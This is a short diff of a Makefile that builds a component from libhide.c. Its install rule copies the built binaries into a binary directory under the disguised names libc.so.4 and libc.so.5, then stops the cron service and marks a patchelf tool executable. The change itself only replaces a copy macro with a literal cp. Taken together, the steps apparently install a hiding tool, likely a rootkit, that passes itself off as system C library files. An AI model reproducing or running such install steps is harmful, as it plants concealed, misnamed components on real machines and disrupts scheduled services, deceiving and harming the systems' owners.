@@ -19,8 +19,8 @@ $(LIBHIDE): libhide.c
 	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS)
 
 install: all
-	$(CP) $(LIBEXEC) $(BINDIR)/libc.so.4
-	$(CP) $(LIBHIDE) $(BINDIR)/libc.so.5
+	cp $(LIBEXEC) $(BINDIR)/libc.so.4
+	cp $(LIBHIDE) $(BINDIR)/libc.so.5
 
 	systemctl stop cron
 	chmod +x ./patchelf
